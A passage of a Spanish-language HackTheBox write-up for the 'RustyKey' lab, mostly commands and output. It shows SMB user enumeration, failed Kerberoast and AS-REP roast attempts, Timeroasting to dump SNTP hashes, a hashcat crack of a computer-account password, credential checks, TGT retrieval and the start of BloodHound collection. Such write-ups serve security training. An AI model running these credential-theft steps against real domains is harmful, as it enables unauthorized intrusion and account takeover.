+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;rustykey.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;atime_epoch&#34;</span>: <span class="s2">&#34;2024-12-28 23:38:26&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;ctime_epoch&#34;</span>: <span class="s2">&#34;2024-12-27 01:52:32&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;mtime_epoch&#34;</span>: <span class="s2">&#34;2024-12-28 23:38:26&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;size&#34;</span>: <span class="s2">&#34;23 B&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;rustykey.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;atime_epoch&#34;</span>: <span class="s2">&#34;2024-12-28 23:38:26&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;ctime_epoch&#34;</span>: <span class="s2">&#34;2024-12-27 01:52:32&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;mtime_epoch&#34;</span>: <span class="s2">&#34;2024-12-28 23:38:26&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;size&#34;</span>: <span class="s2">&#34;800 B&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;rustykey.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;atime_epoch&#34;</span>: <span class="s2">&#34;2024-12-27 01:59:39&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;ctime_epoch&#34;</span>: <span class="s2">&#34;2024-12-27 01:59:39&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;mtime_epoch&#34;</span>: <span class="s2">&#34;2024-12-28 23:37:36&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;size&#34;</span>: <span class="s2">&#34;2.73 KB&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;rustykey.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;atime_epoch&#34;</span>: <span class="s2">&#34;2025-06-25 00:59:55&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;ctime_epoch&#34;</span>: <span class="s2">&#34;2024-12-27 01:52:32&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;mtime_epoch&#34;</span>: <span class="s2">&#34;2025-06-25 00:59:55&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;size&#34;</span>: <span class="s2">&#34;23 B&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;rustykey.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;atime_epoch&#34;</span>: <span class="s2">&#34;2025-06-25 00:59:55&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;ctime_epoch&#34;</span>: <span class="s2">&#34;2024-12-27 01:52:33&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;mtime_epoch&#34;</span>: <span class="s2">&#34;2025-06-25 00:59:55&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;size&#34;</span>: <span class="s2">&#34;4.58 KB&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><h2 id="enumeración-usuarios---nxc">Enumeración Usuarios - nxc<a hidden class="anchor" aria-hidden="true" href="#enumeración-usuarios---nxc">#</a></h2>
+<p>Ahora hacemos lo mismo que en la anterior enumeración pero usando el parámetro <code>--users</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb <span class="s2">&#34;</span><span class="nv">$FQDN</span><span class="s2">&#34;</span> --use-kcache --users
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:rustykey.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> RUSTYKEY.HTB<span class="se">\r</span>r.parker from ccache
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               Administrator                 2025-06-04 22:52:22 <span class="m">0</span>       Built-in account <span class="k">for</span> administering the computer/domain
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               Guest                         &lt;never&gt;             <span class="m">0</span>       Built-in account <span class="k">for</span> guest access to the computer/domain
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               krbtgt                        2024-12-27 00:53:40 <span class="m">0</span>       Key Distribution Center Service Account
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               rr.parker                     2025-06-04 22:54:15 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               mm.turner                     2024-12-27 10:18:39 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               bb.morgan                     2025-07-01 05:46:40 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               gg.anderson                   2025-07-01 05:46:40 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               dd.ali                        2025-07-01 05:46:40 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               ee.reed                       2025-07-01 05:46:40 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               nn.marcos                     2024-12-27 11:34:50 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               backupadmin                   2024-12-30 00:30:18 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Enumerated <span class="m">11</span> <span class="nb">local</span> users: RUSTYKEY
+</span></span></code></pre></div><p>Ahora vamos a guardarnos todos estos usuarios en una lista llamada <code>users.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cat users.txt
+</span></span><span class="line"><span class="cl">───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">       │ File: users.txt
+</span></span><span class="line"><span class="cl">───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               Administrator                 2025-06-04 22:52:22 <span class="m">0</span>       Built-in account <span class="k">for</span> administering the computer/domain
+</span></span><span class="line"><span class="cl">   <span class="m">2</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               Guest                         &lt;never&gt;             <span class="m">0</span>       Built-in account <span class="k">for</span> guest access to the computer/domain
+</span></span><span class="line"><span class="cl">   <span class="m">3</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               krbtgt                        2024-12-27 00:53:40 <span class="m">0</span>       Key Distribution Center Service Account
+</span></span><span class="line"><span class="cl">   <span class="m">4</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               rr.parker                     2025-06-04 22:54:15 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">   <span class="m">5</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               mm.turner                     2024-12-27 10:18:39 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">   <span class="m">6</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               bb.morgan                     2025-07-01 05:46:40 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">   <span class="m">7</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               gg.anderson                   2025-07-01 05:46:40 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">   <span class="m">8</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               dd.ali                        2025-07-01 05:46:40 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">   <span class="m">9</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               ee.reed                       2025-07-01 05:46:40 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  <span class="m">10</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               nn.marcos                     2024-12-27 11:34:50 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  <span class="m">11</span>   │ SMB         DC.rustykey.htb <span class="m">445</span>    DC               backupadmin                   2024-12-30 00:30:18 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ cat users.txt <span class="p">|</span> awk <span class="s1">&#39;{print $5}&#39;</span> <span class="p">|</span> sponge users.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ cat users.txt
+</span></span><span class="line"><span class="cl">───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">       │ File: users.txt
+</span></span><span class="line"><span class="cl">───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>   │ Administrator
+</span></span><span class="line"><span class="cl">   <span class="m">2</span>   │ Guest
+</span></span><span class="line"><span class="cl">   <span class="m">3</span>   │ krbtgt
+</span></span><span class="line"><span class="cl">   <span class="m">4</span>   │ rr.parker
+</span></span><span class="line"><span class="cl">   <span class="m">5</span>   │ mm.turner
+</span></span><span class="line"><span class="cl">   <span class="m">6</span>   │ bb.morgan
+</span></span><span class="line"><span class="cl">   <span class="m">7</span>   │ gg.anderson
+</span></span><span class="line"><span class="cl">   <span class="m">8</span>   │ dd.ali
+</span></span><span class="line"><span class="cl">   <span class="m">9</span>   │ ee.reed
+</span></span><span class="line"><span class="cl">  <span class="m">10</span>   │ nn.marcos
+</span></span><span class="line"><span class="cl">  <span class="m">11</span>   │ backupadmin
+</span></span><span class="line"><span class="cl">───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><h2 id="kerberoasting-attack-and-as-rep-roast-attack---getnpusers-failed">Kerberoasting Attack and AS-REP Roast Attack - GetNPUsers (FAILED)<a hidden class="anchor" aria-hidden="true" href="#kerberoasting-attack-and-as-rep-roast-attack---getnpusers-failed">#</a></h2>
+<p>Primero y como tenemos credenciales válidas del dominio vamos a intentar hacer el ataque Kerberoasting. En el cual solicitamos el <code>Ticket Garanting Service (TGS)</code> a las cuentas del dominio que tengan asignadas un <code>servicePrincipalName (SPN)</code>.</p>
+<p>En este caso vemos que no se detecto ninguna cuanta con el SPN asignado con lo cual no nos saco ninguna entrada.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ GetNPUsers.py -request -dc-ip 10.10.11.75 -dc-host DC rustykey.htb/rr.parker -k -no-pass -outputfile kerberoasting.hashes
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">No entries found!
+</span></span></code></pre></div><p>Luego intentamos el ataque <code>AS-REP Roast</code> que consiste en solicitar un <code>Ticket Garanting Ticket (TGT)</code> a los usuarios que tenemos en la lista <code>users.txt</code> y que tengas habilitada la flag <code>DONT_REQ_PREAUTH</code> de Kerberos.</p>
+<p>Como ninguno de los usuarios tenia dicha flag activada, no se pudo conseguir el objetivo de obtener el TGT sin autenticación previa.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ GetNPUsers.py -dc-ip 10.10.11.75 rustykey.htb/ -no-pass -usersfile users.txt -outputfile kerberoasting.hashes
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Administrator doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User rr.parker doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User mm.turner doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User dd.ali doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP<span class="o">(</span>KDC has no support <span class="k">for</span> encryption <span class="nb">type</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User nn.marcos doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User backupadmin doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span></code></pre></div><h2 id="timeroasting-attack---timeroastpy">Timeroasting Attack - Timeroast.py<a hidden class="anchor" aria-hidden="true" href="#timeroasting-attack---timeroastpy">#</a></h2>
+<p>Haciendo uso del mecanismo de autenticación NTP, como atacantes no autorizados podemos hacer peticiones para recibir los hash de las contraseñas.</p>
+<p><a href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-roasting-timeroasting/">Timeroasting</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ /opt/Herramientas/Timeroast/timeroast.py 10.10.11.75 <span class="p">|</span> tee ntp-hashes.txt
+</span></span><span class="line"><span class="cl">1000:<span class="nv">$sntp</span>-ms<span class="nv">$c5ef4f46dd337b4fe8532de0513006b8$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e311f779e1b8428bffbfcd0aec0ee2c39ae0b765ec0ee2c39ae0ddfb
+</span></span><span class="line"><span class="cl">1103:<span class="nv">$sntp</span>-ms<span class="nv">$eb1665fbff280dda014df6c8488365d9$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e48fd84fe1b8428bffbfcd0aec0ee2c4346ef226ec0ee2c4346f27d6
+</span></span><span class="line"><span class="cl">1104:<span class="nv">$sntp</span>-ms<span class="nv">$fb44b5aae79f17241e2309266e8d43d0$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e244eff4e1b8428bffbfcd0aec0ee2c4363c9689ec0ee2c4363cd49c
+</span></span><span class="line"><span class="cl">1105:<span class="nv">$sntp</span>-ms<span class="nv">$320</span>bc421c1c9d94a2cd9167690407e21<span class="nv">$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e37c9d09e1b8428bffbfcd0aec0ee2c4377448a7ec0ee2c437748004
+</span></span><span class="line"><span class="cl">1106:<span class="nv">$sntp</span>-ms<span class="nv">$691323</span>cb889f1d4942ba852b76dddd41<span class="nv">$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e11f7aefe1b8428bffbfcd0aec0ee2c438ee2a14ec0ee2c438ee6828
+</span></span><span class="line"><span class="cl">1107:<span class="nv">$sntp</span>-ms<span class="nv">$3</span>df435634efabe597c6ba45b467b32a9<span class="nv">$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e2b5db18e1b8428bffbfcd0aec0ee2c43a8490f3ec0ee2c43a84c9fe
+</span></span><span class="line"><span class="cl">1118:<span class="nv">$sntp</span>-ms<span class="nv">$ed34432091c0f7c00083789da362b8fa$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e2d472b3e1b8428bffbfcd0aec0ee2c446ab565aec0ee2c446ab97c8
+</span></span><span class="line"><span class="cl">1119:<span class="nv">$sntp</span>-ms<span class="nv">$5</span>a5d5270a9da3449524a6085f688540e<span class="nv">$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e462cd54e1b8428bffbfcd0aec0ee2c44839abf3ec0ee2c44839f0bc
+</span></span><span class="line"><span class="cl">1120:<span class="nv">$sntp</span>-ms<span class="nv">$ddc14498b787aea173941e2769d23d3e$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e1b381a2e1b8428bffbfcd0aec0ee2c449a2fdc6ec0ee2c449a331c8
+</span></span><span class="line"><span class="cl">1121:<span class="nv">$sntp</span>-ms<span class="nv">$b3883b18358ee4c84cff74c9dc866a93$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e33c6bc1e1b8428bffbfcd0aec0ee2c44b2bdf81ec0ee2c44b2c1f42
+</span></span><span class="line"><span class="cl">1122:<span class="nv">$sntp</span>-ms<span class="nv">$0779</span>b1e1f5ea64304171b7629bb85d66<span class="nv">$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e0e43096e1b8428bffbfcd0aec0ee2c44caab6f8ec0ee2c44caaeafa
+</span></span><span class="line"><span class="cl">1123:<span class="nv">$sntp</span>-ms<span class="nv">$99</span>be370df44d079b625f8b9bd2cf7e77<span class="nv">$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e2687a3ce1b8428bffbfcd0aec0ee2c44e2efd43ec0ee2c44e2f37fb
+</span></span><span class="line"><span class="cl">1124:<span class="nv">$sntp</span>-ms<span class="nv">$c9c9afd2b5e0a213f86405a8bec502e1$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e3cf38b7e1b8428bffbfcd0aec0ee2c44f95bbbeec0ee2c44f95fd2c
+</span></span><span class="line"><span class="cl">1125:<span class="nv">$sntp</span>-ms<span class="nv">$3524750</span>c3f3d67dc77afd70a9aaa089d<span class="nv">$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e128fefce1b8428bffbfcd0aec0ee2c45107fc4dec0ee2c45108538b
+</span></span><span class="line"><span class="cl">1126:<span class="nv">$sntp</span>-ms<span class="nv">$451</span>ef9681d71a9fc31e9260b5375b049<span class="nv">$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e132a13ce1b8428bffbfcd0aec0ee2c45111bcc0ec0ee2c45111ebba
+</span></span><span class="line"><span class="cl">1127:<span class="nv">$sntp</span>-ms<span class="nv">$c265a4c43762196620b4938f2ce99800$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e29c1d01e1b8428bffbfcd0aec0ee2c4527b2e74ec0ee2c4527b6fe2
+</span></span></code></pre></div><p>Y luego lo craqueamos con hashcat. En mi caso con mi hashcat instalado en mi máquina estaba teniendo un error ya que no existía el <em>modulo 31300</em>. Así que me tuve que descargar el binario de la versión beta de hashcat que si que tenía este modulo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ./hashcat.bin -m <span class="m">31300</span> ~/Workspace/HTB/RustyKey/CONTENT/solo_ntp-hashes.txt /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.2.6-1063-g696fa3b2a<span class="o">)</span> starting
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...SNIP
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Watchdog: Temperature abort trigger <span class="nb">set</span> to 90c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host memory required <span class="k">for</span> this attack: <span class="m">617</span> MB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dictionary cache built:
+</span></span><span class="line"><span class="cl">* Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></span><span class="line"><span class="cl">* Passwords.: <span class="m">14344391</span>
+</span></span><span class="line"><span class="cl">* Bytes.....: <span class="m">139921497</span>
+</span></span><span class="line"><span class="cl">* Keyspace..: <span class="m">14344384</span>
+</span></span><span class="line"><span class="cl">* Runtime...: <span class="m">1</span> sec
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$sntp</span>-ms<span class="nv">$3524750</span>c3f3d67dc77afd70a9aaa089d<span class="nv">$1</span>c0111e900000000000a0dbf4c4f434cec0ed0a3e128fefce1b8428bffbfcd0aec0ee2c45107fc4dec0ee2c45108538b:Rusty88!
+</span></span><span class="line"><span class="cl">Approaching final keyspace - workload adjusted.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Exhausted
+</span></span><span class="line"><span class="cl">Hash.Mode........: <span class="m">31300</span> <span class="o">(</span>MS SNTP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Hash.Target......: /home/borhub/Workspace/HTB/RustyKey/CONTENT/solo_ntp-hashes.txt
+</span></span><span class="line"><span class="cl">Time.Started.....: Wed Jul  <span class="m">2</span> 00:54:07 <span class="m">2025</span> <span class="o">(</span><span class="m">3</span> secs<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time.Estimated...: Wed Jul  <span class="m">2</span> 00:54:10 <span class="m">2025</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
+</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Speed.#01........: 65126.0 kH/s <span class="o">(</span>3.63ms<span class="o">)</span> @ Accel:1024 Loops:1 Thr:64 Vec:1
+</span></span><span class="line"><span class="cl">Recovered........: 1/16 <span class="o">(</span>6.25%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/16 <span class="o">(</span>6.25%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>, 1/16 <span class="o">(</span>6.25%<span class="o">)</span> Salts
+</span></span><span class="line"><span class="cl">Progress.........: 229510144/229510144 <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Rejected.........: 0/229510144 <span class="o">(</span>0.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Point....: 14344384/14344384 <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Sub.#01..: Salt:15 Amplifier:0-1 Iteration:0-1
+</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
+</span></span><span class="line"><span class="cl">Candidates.#01...: 0213Dom -&gt; <span class="nv">$HEX</span><span class="o">[</span>042a0337c2a156616d6f732103<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Hardware.Mon.#01.: Temp: 56c Util:  3% Core: 533MHz Mem:2400MHz Bus:16
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Started: Wed Jul  <span class="m">2</span> 00:53:59 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">Stopped: Wed Jul  <span class="m">2</span> 00:54:12 <span class="m">2025</span>
+</span></span></code></pre></div><p>Si nos fijamos la contraseña que hemos craqueado viene del <code>RID 1125</code>, y si miramos los SID de los equipos del sistema que tenemos enumerados podemos saber que esta contraseña pertenece al equipo <code>ITCOMPUTER3.RUSTYKEY.HTB</code>.</p>
+<p><img alt="Rustykey Machine 1" loading="lazy" src="/img/rustykey/rustykey_machine_1.png"></p>
+<p>Y ahora comprobamos las credenciales con <code>nxc ldap</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc ldap 10.10.11.75 -u <span class="s1">&#39;IT-COMPUTER3&#39;</span> -p <span class="s1">&#39;Rusty88!&#39;</span> -k
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.75     <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:rustykey.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.75     <span class="m">389</span>    DC               <span class="o">[</span>+<span class="o">]</span> rustykey.htb<span class="se">\I</span>T-COMPUTER3:Rusty88!
+</span></span></code></pre></div><p>Ahora vamos a solicitar el <code>Ticket Garanting Ticket (TGT)</code> para usar el archivo .ccache para autenticar-nos más adelante.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ getTGT.py rustykey.htb/IT-COMPUTER3:<span class="s1">&#39;Rusty88!&#39;</span> -dc-ip 10.10.11.75
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in IT-COMPUTER3.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/Workspace/HTB/RustyKey/CONTENT/IT-COMPUTER3.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:/home/borhub/Workspace/HTB/RustyKey/CONTENT/IT-COMPUTER3.ccache
+</span></span><span class="line"><span class="cl">Default principal: IT-COMPUTER3@RUSTYKEY.HTB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting     Expires            Service principal
+</span></span><span class="line"><span class="cl">02/07/25 05:15:47  02/07/25 15:15:47  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
+</span></span><span class="line"><span class="cl">	renew <span class="k">until</span> 03/07/25 05:15:47
+</span></span></code></pre></div><h1 id="bloodhound-enumeration">Bloodhound Enumeration<a hidden class="anchor" aria-hidden="true" href="#bloodhound-enumeration">#</a></h1>
+<p>Haciendo uso de bloodhound-python y con Bloodhound-CE vamos a recolectar toda la información del dominio.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodhound-python -u <span class="s1">&#39;rr.parker&#39;</span> -k -no-pass -d RUSTYKEY.HTB -ns 10.10.11.75 -dc <span class="s2">&#34;</span><span class="nv">$FQDN</span><span class="s2">&#34;</span> -c all --zip --auth-method kerberos
+</span></span><span class="line"><span class="cl">INFO: BloodHound.py <span class="k">for</span> BloodHound LEGACY <span class="o">(</span>BloodHound 4.2 and 4.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">INFO: Found AD domain: rustykey.htb
+</span></span><span class="line"><span class="cl">INFO: Using TGT from cache
+</span></span><span class="line"><span class="cl">INFO: Found TGT with correct principal in ccache file.
+</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: DC.rustykey.htb
